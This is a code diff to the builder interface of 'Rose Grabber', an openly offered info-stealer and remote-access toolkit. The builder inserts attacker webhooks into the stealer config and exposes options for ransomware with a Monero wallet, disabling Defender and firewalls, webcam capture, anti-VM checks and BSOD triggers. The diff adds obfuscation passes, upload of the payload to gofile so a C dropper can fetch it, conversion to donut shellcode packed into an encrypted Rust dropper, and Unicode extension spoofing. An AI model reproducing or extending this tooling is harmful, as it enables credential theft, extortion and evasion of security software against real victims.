@@ -4,6 +4,8 @@ import os
 if int(platform.python_version_tuple()[0] + platform.python_version_tuple()[1]) > 311:
     input('Python 3.12+ is not supported at this time, downgrade to Python 3.11.')
     os._exit(1)
+if not os.path.exists(os.path.join(os.getcwd(), "logs")):
+    os.mkdir(os.path.join(os.getcwd(), "logs"))
 if sys.executable.endswith('pythonw.exe'):
     sys.stdout = open(os.devnull, 'w')
     sys.stderr = open(os.path.join(os.getenv('TEMP'), 'stderr-{}'.format(os.path.basename(sys.argv[0]))), "w")
@@ -13,7 +15,6 @@ import tkinter as tk
 import pyzipper
 import ctypes
 import pyperclip
-import base64
 import random
 import logging
 import subprocess
@@ -32,7 +33,7 @@ pool = ProcessPoolExecutor()
 
 logging.basicConfig(
     level=logging.DEBUG,
-    filename='roselog.log',
+    filename='logs\\roselog.log',
     filemode='a',
     format='[%(filename)s:%(lineno)d] - %(asctime)s - %(levelname)s - %(message)s'
 )
@@ -41,7 +42,7 @@ logger = logging.getLogger(__name__)
 
 __title__ = 'Rose UI Builder'
 __avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/Rose.png'
-__version__ = '2.2'
+__version__ = '2.3'
 __debugm__ = False # Debug mode, dev-only
 __icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/roseb.png"
 __devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/ui/msg.txt").text.splitlines()[0].split(" - ")
@@ -101,9 +102,10 @@ data_builder = {
 links = {
     "xpierroz_github": "https://github.com/xpierroz",
     "xpierroz_insta": "https://www.instagram.com/_p.slm/",
-    "gumbobr0t_github": "https://github.com/gumbobrot",
-    "suegdu_github": "https://github.com/suegdu",
+    "gumbobr0t_github": "https://github.com/gumbobr0t",
+    "suegdu_github": "https://github.com/suenerve",
     "svn_github": "https://github.com/suvan1911",
+    "smth_github": "https://github.com/smthpy",
     "rose_github": "https://github.com/DamagingRose/Rose-Grabber",
     "rose_discord": "https://discord.gg/sbt9drkvAA"
 }
@@ -175,13 +177,14 @@ async def test_webhook(webhook_url):
         logger.error(f"Webhook failed to execute - Link: {webhook_url} - Error: {e}")
         return 1
 
-random.seed(0)
+def gen_random(c:int):
+    characters = string.ascii_letters + string.digits
+    return ''.join(random.choice(characters) for _ in range(c))
 
-characters = string.ascii_letters + string.digits
-
-gen = ''.join(random.choice(characters) for _ in range(10))
-zip_passw = 'rose123'
-zip_name = f'Rose-Final-{gen}.zip'
+zip_passw = b'rose123'
+zip_name = f'Rose-Final-{gen_random(10)}.zip'
+logger.debug(zip_passw)
+logger.debug(zip_name)
 
 def _makebuild(q: Queue, data_builder) -> str:
     logger.info("Entered _makebuild")
@@ -202,9 +205,13 @@ def _makebuild(q: Queue, data_builder) -> str:
         ui.notify("Knight-RAT Bot Token is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
         return
     
-    if data_builder["icon_file"] == "Windows Exe" or "":
-        win_exe_path = os.path.join(os.getcwd(), "resources", "assets", "executable.ico")
-        data_builder["icon_path"] = win_exe_path
+    if data_builder["icon_file"] == "":
+        ui.notify("No build icon selected!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
+        return
+    
+    if data_builder["type_file"] == "":
+        ui.notify("No build type selected!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
+        return
     
     if data_builder["file_pumper_size"] == "":
         data_builder["file_pumper_size"] = None
@@ -214,11 +221,19 @@ def _makebuild(q: Queue, data_builder) -> str:
 
     ui.notify("Build has been started!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
         
-    path = f"{Path(__file__).resolve().parent}\\{data_builder['build_name']}"
+    path = os.path.join(Path(__file__).resolve().parent, data_builder['build_name'])
+    rosef = os.path.join(path, 'rose.py')
+    rosefu = os.path.join(path, 'obf-rose.py')
+    rosefub = os.path.join(path, 'obf2-rose.py')
+    blankobf = os.path.join(Path(__file__).resolve().parent.parent, 'utils', 'obfuscation', 'blankobf.py')
+    pycloak = os.path.join(Path(__file__).resolve().parent.parent, 'utils', 'obfuscation', 'pycloak-main')
+    rvenv = os.path.join(Path(__file__).resolve().parent.parent.parent, 'rosevenv', 'Scripts', 'activate')
+    final = 'dist\\obf2-rose.exe' if data_builder["obfuscation"] else 'dist\\rose.exe'
         
+    logger.info(path+rosef+rosefu+blankobf)
     def create_dir():
         logger.info("Entered create_dir")
-        try:       
+        try:
             logger.info(f"Path in create_dir is {path}")
             os.mkdir(path)
         except Exception as e:
@@ -226,20 +241,21 @@ def _makebuild(q: Queue, data_builder) -> str:
 
     def get_files():
         try:
-            logging.info("Entering get_files")
-            cwd = os.path.join(os.getcwd(), "resources", "source", "bin")
-            os.mkdir(os.path.join(path, "bin"))
-            for file in os.listdir(cwd):
-                shutil.copy(os.path.join(cwd, file), os.path.join(path, "bin"))
-            shutil.copy(os.path.join(os.getcwd(), "resources", "source", "main.py"), path)
-            logger.info(f'Successfully copied all files from {cwd} to {path}')
+            logging.info("Entered get_files")
+            shutil.copy(os.path.join(Path(__file__).resolve().parent.parent, "source", "rose.py"), path)
+            shutil.copy(os.path.join(Path(__file__).resolve().parent.parent, "source", "c-exec", "main.c"), path)
+            shutil.copytree(os.path.join(Path(__file__).resolve().parent.parent, "source", "nodejs"), os.path.join(path, "nodejs"))
+            shutil.copytree(os.path.join(Path(__file__).resolve().parent.parent, "source", "rust-drop"), os.path.join(path, "rust-drop"))
+            shutil.copy(os.path.join(Path(__file__).resolve().parent.parent, "utils", "donut", "donut.exe"), path)
+            shutil.copy(os.path.join(Path(__file__).resolve().parent.parent, "utils", "Pestilence-master", "encrypt_shellcode.py"), os.path.join(path, "rust-drop"))
+            logger.info(f'Successfully copied components to {path}')
         except Exception as e:
             logger.error(f"Error in get_files: {e}")
 
     def edit_config():
         try:
             logger.info("Entered edit_config")
-            with open(f"{path}\\bin\\config.py","r",encoding="utf-8") as f:
+            with open(rosef, "r", encoding="utf-8") as f:
                 text = f.read()
                 new = text.replace("WEBHOOK_URL", f"{replace_discord_url(data_builder['webhook_url'])}") \
                 .replace("rose_discord_rat = False", f"rose_discord_rat = {data_builder['rose_rat']}") \
@@ -264,7 +280,6 @@ def _makebuild(q: Queue, data_builder) -> str:
                 .replace("disable_defender = False", f"disable_defender = {data_builder['disable_defender']}") \
                 .replace("disable_firewalls = False", f"disable_firewalls = {data_builder['disable_firewalls']}") \
                 .replace("fake_error = False", f"fake_error = {data_builder['fake_error']}") \
-                .replace("nitro_auto_buy = False", f"nitro_auto_buy = {data_builder['nitro_buy']}") \
                 .replace("antivm = False", f"antivm = {data_builder['antivm']}") \
                 .replace("webcam = False", f"webcam = {data_builder['webcam']}") \
                 .replace("ransomware = False", f"ransomware = {data_builder['ransomware']}") \
@@ -281,19 +296,39 @@ def _makebuild(q: Queue, data_builder) -> str:
                 .replace("block_sites = False", f"block_sites = {data_builder['bsites']}") \
                 .replace("disable_protectors = False", f"disable_protectors = {data_builder['disableprot']}")
 
-                # noqa: E501
+                #.replace("nitro_auto_buy = False", f"nitro_auto_buy = {data_builder['nitro_buy']}") \
                 
-            with open(f"{path}\\bin\\config.py", "w", encoding="utf-8") as f:
+            with open(rosef, "w", encoding="utf-8") as f:
                 f.write(new)
         except Exception as e:
             logger.error(f"Error in edit_config: {e}")
 
+    def obfuscate():
+        logger.info("Entered obfuscate")
+        if data_builder["obfuscation"]:
+            logger.info("Entering obfuscate")
+            try:
+                logger.info("Entering obfuscate process")
+                obf1 = f'call {rvenv} && python {blankobf} -o {rosefu} {rosef}'
+                logger.info(obf1)
+                subprocess.call(obf1, shell=True, stdout=open('logs\\obf-blank.txt', 'w'), stderr=subprocess.STDOUT)
+                install = f'call {rvenv} && cd "{pycloak}" && pip install .'
+                logger.info(install)
+                subprocess.call(install, shell=True, stdout=open('logs\\obf-install.txt', 'w'), stderr=subprocess.STDOUT)
+                obf2 = f'call {rvenv} && pycloak -o {rosefub} -d {rosefu}'
+                logger.info(obf2)
+                subprocess.call(obf2, shell=True, stdout=open('logs\\obf-pycloak.txt', 'w', encoding='utf-8', errors='ignore'), stderr=subprocess.STDOUT)
+                os.remove(rosefu)
+                logger.info("Finished obfuscate process")
+            except Exception as e:
+                logger.error(f"Error in obfuscate: {e}")
+    
     def pump_file():
+        logger.info("Entered pump_file")
         pumping_proc = 0
         if data_builder["file_pumper"]:
             if data_builder["file_pumper_size"] is not None:
-                logger.info(f"DEBUGGING File pumper is set to: {data_builder['file_pumper']}")
-                logger.info(f"DEBUGGING File pumper size is set to: {data_builder['file_pumper_size']}")
+                logger.info(f"DEBUGGING File pumper size is set to {data_builder['file_pumper_size']} MB")
                 logger.info("Entering file pump process")
                 try:
                     b_size = int(data_builder["file_pumper_size"]) * 1048576
@@ -306,47 +341,261 @@ def _makebuild(q: Queue, data_builder) -> str:
                     logger.info("Finished file pump process")
                 except Exception as e:
                     logger.error(f"Error in pumping file: {e}")
+    
+    def get_best_server():
+        server_url = "https://api.gofile.io/getServer"
+        response = requests.get(server_url)
+        server_data = response.json()
+    
+        if response.status_code != 200 or server_data['status'] != 'ok':
+            logger.error(f"Failed to get best server. Response: {server_data}")
+            return None
+    
+        return server_data['data']
 
-    def compile():
+    def upload_to_gofile(file_path):
+        best_server = get_best_server()
+    
+        if best_server is None:
+            return None
+
+        upload_url = f"https://{best_server['server']}.gofile.io/uploadFile"
+        files = {'file': open(file_path, 'rb')}
+    
         try:
-            logger.info("Entering compile process")
-            logger.info(f'Compile CMD Line: call myvenv/Scripts/activate && python -m PyInstaller "{path}\\main.py" --clean --icon="{data_builder["icon_path"]}" --upx-dir="{os.path.join(os.getcwd(), "resources", "ui", "upx-4.1.0-win64")}" --noconsole --onefile')
-            output_file = "rosecompile.log"
+            logger.info(f"Uploading file to {upload_url}...")
+            response = requests.post(upload_url, files=files)
+
+            response.raise_for_status()
+        except requests.exceptions.HTTPError as errh:
+            logger.error(f"HTTP Error: {errh}")
+        except requests.exceptions.ConnectionError as errc:
+            logger.error(f"Error Connecting: {errc}")
+        except requests.exceptions.Timeout as errt:
+            logger.error(f"Timeout Error: {errt}")
+        except requests.exceptions.RequestException as err:
+            logger.error(f"Error: {err}")
+            return None
+
+        data = response.json()
+        logger.info(data)
+        if data['status'] == 'ok':
+            content_id = data['data']['fileId']
+        else:
+            logger.error(f"Failed to get content ID. Response: {data}")
+            return None
+
+        download_link = f"https://{best_server['server']}.gofile.io/download/{content_id}/{os.path.basename(file_path)}"
+
+        return download_link
+    
+    def compile_python():
+        logger.info("Entered py compile")
+        upx_dir = os.path.join(Path(__file__).resolve().parent.parent, 'utils', 'upx-4.1.0-win64')
+        himports = [
+            'os',
+            're',
+            'ctypes',
+            'pygame',
+            'pygame.camera',
+            'subprocess',
+            'threading',
+            'sys',
+            'platform',
+            'shutil',
+            'sqlite3',
+            'string',
+            'random',
+            'browser_cookie3',
+            'base64',
+            'json',
+            'requests',
+            'psutil',
+            'discord',
+            'discord.ext',
+            'discord.ext.commands',
+            'winreg',
+            'win32con',
+            'keyboard',
+            'pywifi',
+            'pathlib',
+            'cv2',
+            'io',
+            'time',
+            'pyttsx3',
+            'webbrowser',
+            'socketio',
+            'uuid',
+            'socket',
+            'pyautogui',
+            'wmi',
+            'GPUtil',
+            'zipfile',
+            'getmac',
+            'errno',
+            'urllib',
+            'urllib.error',
+            'pynput',
+            'pynput.keyboard',
+            'cryptography',
+            'cryptography.fernet',
+            'win32crypt',
+            'dhooks',
+            'Crypto',
+            'Crypto.Cipher',
+            'Crypto.Cipher.AES',
+            'PIL',
+            'PIL.ImageGrab',
+            'zlib',
+            'mss',
+            'datetime',
+            'ctypes.windll',
+            'ctypes.c_int',
+            'ctypes.c_uint',
+            'ctypes.c_ulong',
+            'ctypes.POINTER',
+            'ctypes.byref',
+            'json.loads',
+            'json.dumps',
+            'zipfile.ZipFile',
+            'urllib.request',
+            'urllib.request.Request',
+            'urllib.request.urlopen',
+            'base64.b64decode',
+            'socketio',
+            'time',
+            'zlib.compress',
+            'mss.mss',
+            'lzma'
+        ]
+        himports = [item for item in himports if item]
+        
+        imports = " ".join(["--hidden-import=" + module for module in himports])
+        compile_line = f'call {rvenv} && pyinstaller "{rosefub if data_builder["obfuscation"] else rosef}" --clean --icon="{data_builder["icon_path"]}" --upx-dir="{upx_dir}" --noconsole --onefile {imports}'
+        try:
+            logger.info("Entering python compile process")
+            logger.info(f'Python Compile CMD Line: {compile_line}')
+            output_file = "logs\\rosecompile-py.log"
             subprocess.call(
-                f'call myvenv/Scripts/activate && python -m PyInstaller "{path}\\main.py" --clean --icon="{data_builder["icon_path"]}" --upx-dir="{os.path.join(os.getcwd(), "resources", "ui", "upx-4.1.0-win64")}" --noconsole --onefile',
+                compile_line,
                 shell=True,
                 stdout=open(output_file, 'w'),
                 stderr=subprocess.STDOUT
             )
-            logger.info(f"Output of compile process saved in rosecompile.log")
+            logger.info(f"Output of Python compile process saved in rosecompile.log")
         except Exception as e:
-            logger.error(f"Error in compile: {e}")
+            logger.error(f"Error in py compile: {e}")
+
+    c = os.path.join(path, "main.c")
+    cf = os.path.join(path, "main.exe")
+    cf2 = os.path.join(path, "main")
+    donut = os.path.join(path, "donut.exe")
+    shellc = os.path.join(path, "rust-drop", "shellcode.bin")
+    rsdir = os.path.join(path, "rust-drop")
+    encc = os.path.join(path, "encrypt_shellcode.py")
+    rsf = os.path.join(path, 'pestilence-master', 'target', 'release', 'pestilence.exe')
+    
+    def c_conf():
+        execu = os.path.join(os.getcwd(), final)
+        logger.info("Entered c_conf")
+        contents = open(c, "r").read()
+        contents = contents.replace("<MALWARE_URL>", f"{upload_to_gofile(execu)}")
+        open(c, "w").write(contents)
+    
+    def compile_c():
+        logger.info("Entered c compile")
+        compile_line = f'gcc {c} -o {cf2} -mwindows'
+        try:
+            logger.info("Entering c compile process")
+            logger.info(f'C Compile CMD Line: {compile_line}')
+            output_file = "logs\\rosecompile-c.log"
+            subprocess.call(
+                compile_line,
+                shell=True,
+                stdout=open(output_file, 'w'),
+                stderr=subprocess.STDOUT
+            )
+            logger.info(f"Output of C compile process saved in rosecompile.log")
+        except Exception as e:
+            logger.error(f"Error in c compile: {e}")
+
+    def compile_rs():
+        logger.info("Entered rust compile")
+        output_file = "logs\\rosecompile-rs.log"
+        encrypt_file = "logs\\encrypt.log"
+        shell_file = "logs\\shellcode.log"
+        shell_cmd = f"\"{donut}\" --input:{cf} --output:{shellc}"
+        logger.info(f"Shellcode CMD Line: {shell_cmd}")
+        subprocess.run(shell_cmd, shell=True, stdout=open(shell_file, 'w'), stderr=subprocess.STDOUT)
+        encrypt_line = f"call {rvenv} && cd \"{os.path.join(path, 'rust-drop')}\" && python {encc} {shellc}"
+        logger.info(f"Encrypt CMD Line: {encrypt_line}")
+        subprocess.run(encrypt_line, shell=True, stdout=open(encrypt_file, 'w'), stderr=subprocess.STDOUT)
+        rs_compile_line = f'cd "{rsdir}" && cargo build --release'
+        try:
+            logger.info("Entering rust compile process")
+            logger.info(f'Rust Compile CMD Line: {rs_compile_line}')
+            subprocess.call(
+                rs_compile_line,
+                shell=True,
+                stdout=open(output_file, 'w'),
+                stderr=subprocess.STDOUT
+            )
+            logger.info(f"Output of Rust compile process saved in rosecompile.log")
+        except Exception as e:
+            logger.error(f"Error in rust compile: {e}")
+
+    js=os.path.join(path, "nodejs")
+    
+    def compile_js():
+        logger.info("Entered js compile")
+        output_file = "logs\\rosecompile-js.log"
+        inst_file = "logs\\rosecompile-js-inst.log"
+        subprocess.call(f'npm install -g pkg && cd "{js}" && npm i', shell=True, stdout=open(inst_file, 'w'), stderr=subprocess.STDOUT)
+        #shutil.move(rsf, js)
+        #compile_line = f'node "{os.path.join(js, "index.js")}" "{rsf}" "{path}"'
+        execu = os.path.join(os.getcwd(), final)
+        compile_line = f'node "{os.path.join(js, "index.js")}" "{execu}" "{path}"'
+        try:
+            logger.info("Entering js compile process")
+            logger.info(f'JS Compile CMD Line: {compile_line}')
+            subprocess.call(
+                compile_line,
+                shell=True,
+                stdout=open(output_file, 'w'),
+                stderr=subprocess.STDOUT
+            )
+            logger.info(f"Output of JS compile process saved in rosecompile.log")
+        except Exception as e:
+            logger.error(f"Error in js compile: {e}")
 
     def cleanup():
-        logger.info("Entering cleanup")
+        logger.info("Entered cleanup")
 
         backup_dir = data_builder['build_name'] + '_backup'
+
         try:
-            shutil.move(os.path.join(os.getcwd(), "dist", "main.exe"), os.path.join(os.getcwd(), f"{data_builder['build_name']}.exe"))
+            shutil.move(os.path.join(os.getcwd(), 'dist', "obf2-rose.exe" if data_builder['obfuscation'] else "rose.exe"), os.path.join(os.getcwd(), f"{data_builder['build_name']}.exe"))
             shutil.rmtree(os.path.join(os.getcwd(), 'build'))
             shutil.rmtree(os.path.join(os.getcwd(), 'dist'))
             shutil.rmtree(os.path.join(os.getcwd(), "resources", "ui", data_builder['build_name']))
-            os.remove(os.path.join(os.getcwd(), "main.spec"))
+            os.remove(os.path.join(os.getcwd(), "obf2-rose.spec" if data_builder['obfuscation'] else "rose.spec"))
             if os.path.exists(backup_dir) and os.path.isdir(backup_dir):
                 shutil.rmtree(backup_dir)
         except Exception as e:
             logger.error(f"Error in cleanup: {e}")
 
     def assign_extension():
-        old_exe_path = os.getcwd() + f'\{data_builder["build_name"]}.exe'
-        new_scr_path = os.getcwd() + f'\{data_builder["build_name"]}.scr'
+        logger.info('Entered assign_extension')
+
+        old_exe_path = os.path.join(os.getcwd(), data_builder["build_name"]+'.exe')
+        new_scr_path = os.path.join(os.getcwd(), data_builder["build_name"]+'.scr')
         if data_builder["type_file"] == 'Screensaver (.scr)':
             os.rename(old_exe_path, new_scr_path)
 
     def upx():
-        logger.info('Entering upx')
+        logger.info('Entered upx')
         try:
-            shutil.copy(os.path.join(os.getcwd(), "components", "roseui", "upx-4.1.0-win64", "upx.exe"), os.getcwd())
+            shutil.copy(os.path.join(Path(__file__).resolve().parent.parent, 'utils', 'upx-4.1.0-win64', "upx.exe"), os.getcwd())
             subprocess.run(f'upx -9kqvf {data_builder["build_name"]}.exe', shell=True)
             os.remove(os.path.join(os.getcwd(), "upx.exe"))
         except Exception as e:
@@ -354,7 +603,7 @@ def _makebuild(q: Queue, data_builder) -> str:
         logger.info('Finished upx')
 
     def return_zip():
-        logger.info('Entering return_zip')
+        logger.info('Entered return_zip')
         if data_builder["extension_spoofer"]:
             homename = spoofed
         
@@ -363,11 +612,11 @@ def _makebuild(q: Queue, data_builder) -> str:
         try:
             if data_builder["return_zip"]:
                 with pyzipper.AESZipFile(zip_name, 'w', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) as zipf:
-                    zipf.setpassword(zip_passw.encode('utf-8'))
+                    zipf.setpassword(zip_passw)
                     zipf.write(homename, os.path.basename(homename))
         
-                logger.info(f'Password for final zip is: {zip_passw}')
-                logger.debug(f'Encrypted password for final zip is: {zip_passw.encode("utf-8")}')
+                #logger.info(f'Final zip name is: {zip_name}')
+                logger.info(f'Password for final zip is: {zip_passw.decode("utf-8")}')
 
                 if os.path.exists(homename):
                     try:
@@ -387,7 +636,7 @@ def _makebuild(q: Queue, data_builder) -> str:
             logger.error(f"Error in return_zip: {e}")
 
     def extension_spoofer():
-        logger.info('Entering extension_spoofer')
+        logger.info('Entered extension_spoofer')
         spoofer = '\u202e'
         extension = data_builder["spoofed_extension"]
         executable_to_spoof = f'{data_builder["build_name"]}.scr' if data_builder["type_file"] == 'Screensaver (.scr)' else f'{data_builder["build_name"]}.exe'
@@ -414,20 +663,28 @@ def _makebuild(q: Queue, data_builder) -> str:
     q.put_nowait(0.15)
     edit_config()
     q.put_nowait(0.2)
-    #obfuscate()
-    q.put_nowait(0.25)
-    compile()
+    obfuscate()
+    q.put_nowait(0.3)
+    compile_python()
     q.put_nowait(0.4)
-    cleanup()
+    #c_conf()
     q.put_nowait(0.45)
-    #upx()
+    #compile_c()
     q.put_nowait(0.5)
-    pump_file()
+    #compile_rs()
+    q.put_nowait(0.6)
+    #compile_js()
     q.put_nowait(0.7)
-    assign_extension()
+    cleanup()
     q.put_nowait(0.75)
-    extension_spoofer()
+    upx()
+    q.put_nowait(0.8)
+    pump_file()
     q.put_nowait(0.85)
+    assign_extension()
+    q.put_nowait(0.9)
+    extension_spoofer()
+    q.put_nowait(0.95)
     return_zip()
     q.put_nowait(1)
     return 'Done!'
@@ -483,7 +740,7 @@ def _home():
         ui.button('Set custom file icon', on_click=select_icon).props("icon=code color=purple-11").bind_visibility_from(choose_file_icon, 'value')
         ui.select(
             label='Returned file type',
-            options=["Executable (.exe)", "Screensaver (.scr)"],#, "Batch (.bat)", "PowerShell (.ps1)", "Visual Basic Script (.vbs)"],
+            options=["Executable (.exe)", "Screensaver (.scr)"],
             on_change=lambda e: change_data('type_file', e.value)
         ).props("color=pink-3").classes('w-full')
         ui.checkbox('Obfuscation', on_change=lambda e: change_data('obfuscation', e.value)).props('inline color=pink-3')
@@ -493,7 +750,7 @@ def _home():
                 on_change=lambda e: change_data('file_pumper_size', e.value)).bind_visibility_from(_pumper, 'value').props('inline color=pink-3')
         with ui.row():
             _spoofer = ui.checkbox('Extension Spoofer', on_change=lambda e: change_data('extension_spoofer', e.value)).props('inline color=pink-3')
-            ui.input(label='Spoofed Extension', placeholder='zip, pdf...',
+            ui.input(label='Spoofed Extension', placeholder='xlsx, png etc.',
                 on_change=lambda e: change_data('spoofed_extension', e.value)).bind_visibility_from(_spoofer, 'value').props('inline color=pink-3')
         ui.checkbox('Return password protected ZIP archive', on_change=lambda e: change_data('return_zip', e.value)).props('inline color=pink-3')
         ui.button(
@@ -506,12 +763,16 @@ def _home():
         ).props("icon=build color=pink-3").classes('w-full')
 
         progressbar = ui.linear_progress(value=0, show_value=False).props('instant-feedback rounded color=green-8 size=35px stripe')
-        might_take = ui.label("Some steps in the process may take a few minutes, so please be patient :)")
+        might_take = ui.label("The compiler may take some time. BE PATIENT!!")
         progressbar.visible = False
         might_take.visible = False
 
 def _functions():
     with ui.column():
+        ui.button('Knight RAT Docs', on_click=lambda: webbrowser.open("https://github.com/DamagingRose/Rose-Grabber/blob/main/docs/KNIGHT.md"))
+        ui.button('Features Docs', on_click=lambda: webbrowser.open("https://github.com/DamagingRose/Rose-Grabber/blob/main/docs/FEATURES.md"))
+        ui.button('Changelog Docs', on_click=lambda: webbrowser.open("https://github.com/DamagingRose/Rose-Grabber/blob/main/docs/CHANGELOG.md"))
+        
         with ui.expansion('System', icon='work').classes('w-full'):
             ui.checkbox('Startup', on_change=lambda e: change_data('startup', e.value)).props('inline color=pink')
             with ui.row():
@@ -519,10 +780,10 @@ def _functions():
                     'Injection',
                     on_change=lambda e: change_data('injection', e.value)
                 ).props('inline color=pink')
-                ui.checkbox(
-                    'Buy Nitro',
-                    on_change=lambda e: change_data('nitro_buy', e.value)
-                ).bind_visibility_from(_inj, 'value').props('inline color=pink')  
+                #ui.checkbox(
+                #    'Buy Nitro',
+                #    on_change=lambda e: change_data('nitro_buy', e.value)
+                #).bind_visibility_from(_inj, 'value').props('inline color=pink')  
                 
             ui.checkbox('Fake Error', on_change=lambda e: change_data('fake_error', e.value)).props('inline color=pink')
             ui.checkbox('Anti-VM', on_change=lambda e: change_data('antivm', e.value)).props('inline color=pink')
@@ -569,7 +830,7 @@ def _functions():
                 
                 with ui.row():
                     _ransom = ui.checkbox('Rose Ransomware', on_change=lambda e: change_data('ransomware', e.value)).props('inline color=yellow-7')
-                    ui.input(label='Monero Wallet adress', placeholder='Rose On Top baby!!!',
+                    ui.input(label='XMR Wallet adress', placeholder='Rose On Top baby!!!',
                         on_change=lambda e: change_data('ransomware_monero_wallet_adress', e.value)).bind_visibility_from(_ransom, 'value').props('inline color=yellow-7')
                     ui.input(label='Webhook URL', placeholder='Rose On Top baby!!!',
                         on_change=lambda e: change_data('ransomware_discord_webhook_url', e.value)).bind_visibility_from(_ransom, 'value').props('inline color=yellow-7')
@@ -578,7 +839,7 @@ def _functions():
                     ui.input(label='Amount of money', placeholder='Amount of money the victim has to pay. (in USD)',
                         on_change=lambda e: change_data('ransomware_amount_of_money', e.value)).bind_visibility_from(_ransom, 'value').props('inline color=yellow-7')
                     
-                ui.checkbox('Anti-Debug', on_change=lambda e: change_data('rose_melt_stub', e.value)).props('inline color=yellow-7')
+                ui.checkbox('Self-Deletion', on_change=lambda e: change_data('rose_melt_stub', e.value)).props('inline color=yellow-7')
                 ui.checkbox('Trigger BSOD', on_change=lambda e: change_data('tbsod', e.value)).props(
                     'inline color=yellow-7')
                 ui.checkbox('Batch Crash', on_change=lambda e: change_data('bcrash', e.value)).props(
@@ -598,8 +859,8 @@ def _functions():
 def _github():
     with ui.card():
         with ui.row():
-            ui.button("Open Rose Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'roselog.log')))
-            ui.button("Open Rose Compile Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'rosecompile.log')))
+            ui.button("Open Rose Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'logs', 'roselog.log')))
+            ui.button("Open Rose Compile Log (.py)", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'logs', 'rosecompile-py.log')))
 
         with ui.column():
             ui.markdown(f"<code>Message from {__devmsg__[0]}: {__devmsg__[1]}</code>")
@@ -627,6 +888,12 @@ def _github():
                     ui.label("svn").classes("text-h6")
                     ui.markdown('<em>*svn died*</em>').classes("text-subtitle5")
                     ui.button(on_click=lambda: open_link("svn_github")).props("round icon=code color=blue-11")
+
+                with ui.card_section():
+                    ui.label("smth.py").classes("text-h6")
+                    ui.markdown('<em>- Nothing.</em>').classes("text-subtitle5")
+                    ui.button(on_click=lambda: open_link("smth_github")).props("round icon=code color=blue-11")
+
     with ui.card():
         with ui.card_section():
             with ui.row():
